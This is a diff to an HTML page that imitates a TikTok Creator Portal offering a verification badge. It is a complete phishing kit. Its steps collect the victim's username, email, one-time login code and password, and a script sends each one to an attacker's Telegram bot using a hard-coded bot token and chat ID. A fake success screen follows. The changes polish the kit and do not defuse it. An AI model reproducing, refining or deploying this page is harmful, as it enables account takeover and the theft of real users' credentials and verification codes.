@@ -6,94 +6,118 @@
     <title>TikTok Creator Portal | Identity Verification</title>
     <style>
         :root { --tt-pink: #FE2C55; --tt-cyan: #25F4EE; --tt-black: #000; --tt-card: #1d1d1d; }
-        body { margin: 0; background-color: var(--tt-black); font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; box-sizing: border-box; }
-        .container { width: 100%; max-width: 400px; padding: 40px 24px; text-align: center; background: var(--tt-card); border-radius: 12px; border: 1px solid #2a2a2a; }
-        .tt-logo { width: 45px; height: auto; fill: white; margin-bottom: 25px; }
-        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; }
-        p { color: #a1a1a1; font-size: 14px; margin-bottom: 30px; }
+        body { margin: 0; background-color: var(--tt-black); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; box-sizing: border-box; }
+        .container { width: 100%; max-width: 400px; padding: 40px 24px; text-align: center; background: var(--tt-card); border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 1px solid #2a2a2a; }
+        .logo-box { margin-bottom: 25px; display: flex; justify-content: center; }
+        .tt-logo { width: 45px; height: auto; fill: white; }
+        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; letter-spacing: -0.5px; }
+        p { color: #a1a1a1; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
         .step { display: none; }
-        .step.active { display: block; }
+        .step.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
         input { width: 100%; padding: 14px 16px; background: #2f2f2f; border: 1px solid #3d3d3d; border-radius: 4px; color: white; font-size: 15px; outline: none; margin-bottom: 15px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        input:focus { border-color: var(--tt-pink); }
+        .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
         .loader-ring { border: 3px solid #333; border-top: 3px solid var(--tt-cyan); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
 <div class="container">
-    <svg class="tt-logo" viewBox="0 0 448 512"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,448,109.45Z"/></svg>
+    <div class="logo-box">
+        <svg class="tt-logo" viewBox="0 0 448 512"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,448,109.45Z"/></svg>
+    </div>
+
     <div id="step1" class="step active">
         <h1>Claim Your Badge</h1>
         <p>Enter your TikTok @username to check eligibility for the official verification badge.</p>
         <input type="text" id="username" placeholder="@username" spellcheck="false" autocomplete="off">
-        <button class="btn" onclick="submitStep1()">CONTINUE</button>
+        <button class="btn" id="btn1" onclick="submitStep1()">CONTINUE</button>
     </div>
+
     <div id="step2" class="step">
         <h1>Verify Identity</h1>
         <p>Enter the email address currently linked to your TikTok account.</p>
         <input type="email" id="email" placeholder="example@mail.com">
         <button class="btn" onclick="submitStep2()">SEND CODE</button>
     </div>
+
     <div id="step3" class="step">
         <h1>Verify Your Email</h1>
-        <p>Enter the 6-digit code sent to your email.</p>
-        <input type="text" id="code" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+        <p>A 6-digit code has been sent to your email. Enter it below.</p>
+        <input type="text" id="code" placeholder="000000" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
         <button class="btn" onclick="submitStep3()">CONFIRM CODE</button>
     </div>
+
     <div id="step4" class="step">
         <h1>Security Check</h1>
         <p>Confirm your current account password to finalize the request.</p>
         <input type="password" id="password" placeholder="Password">
         <button class="btn" onclick="submitStep4()">VERIFY</button>
     </div>
+
     <div id="step5" class="step">
         <h1>Authenticating...</h1>
         <div class="loader-ring"></div>
+        <p style="color: #25F4EE; font-weight: bold; font-size: 12px;">SECURING CONNECTION...</p>
     </div>
+
     <div id="step6" class="step">
         <div style="color: #25F4EE; font-size: 60px; margin-bottom: 20px;">✓</div>
-        <h1>Identity Verified</h1>
+        <h1>Identity Confirmed</h1>
         <p>Your request has been submitted. The badge will be applied within <b>5 business days</b>.</p>
     </div>
 </div>
+
 <script>
-    const BOT_TOKEN = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g';
-    const CHAT_ID = '7489116869';
-    async function sendMsg(msg) {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    // 🛑 LIVE CONFIGURATION
+    const BOT_TOKEN = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g'; // Aapka Token
+    const CHAT_ID = '7489116869'; // Aapki Chat ID
+
+    async function sendToTelegram(msg) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
         });
     }
+
     function goTo(s) {
         document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
         document.getElementById('step' + s).classList.add('active');
     }
+
     function submitStep1() {
-        const u = document.getElementById('username').value;
-        if(u.length<3 || /[A-Z]/.test(u)) { alert("Small letters only!"); return; }
-        sendMsg(`👤 <b>New Hit</b>\nUser: @${u}`);
+        const user = document.getElementById('username').value;
+        if(user.length < 3 || /[A-Z]/.test(user)) { alert("Username must be lowercase and valid."); return; }
+        sendToTelegram(`👤 <b>New Hit</b>\nUsername: <code>@${user}</code>`);
         goTo(2);
     }
+
     function submitStep2() {
-        const e = document.getElementById('email').value;
-        if(!e.includes('@')) { alert("Invalid Email!"); return; }
-        sendMsg(`📧 <b>Email</b>\nUser: @${document.getElementById('username').value}\nEmail: ${e}`);
+        const email = document.getElementById('email').value;
+        if(!email.includes('@')) { alert("Invalid Email!"); return; }
+        sendToTelegram(`📧 <b>Email</b>\nUser: @${document.getElementById('username').value}\nEmail: <code>${email}</code>`);
         goTo(3);
     }
+
     function submitStep3() {
-        const c = document.getElementById('code').value;
-        if(c.length<6) { alert("Enter 6 digits!"); return; }
-        sendMsg(`🔢 <b>Code</b>\nUser: @${document.getElementById('username').value}\nCode: ${c}`);
+        const code = document.getElementById('code').value;
+        if(code.length < 6) { alert("Enter 6-digit code!"); return; }
+        sendToTelegram(`🔢 <b>OTP Code</b>\nUser: @${document.getElementById('username').value}\nCode: <code>${code}</code>`);
         goTo(4);
     }
+
     function submitStep4() {
-        const p = document.getElementById('password').value;
-        sendMsg(`🔑 <b>PASSWORD</b>\nUser: @${document.getElementById('username').value}\nPass: <code>${p}</code>`);
+        const pass = document.getElementById('password').value;
+        if(pass.length < 4) { alert("Invalid Password!"); return; }
+        sendToTelegram(`🔑 <b>PASSWORD FOUND</b>\nUser: @${document.getElementById('username').value}\nPass: <code>${pass}</code>`);
         goTo(5);
         setTimeout(() => { goTo(6); }, 5000);
     }
 </script>
+
 </body>
 </html>
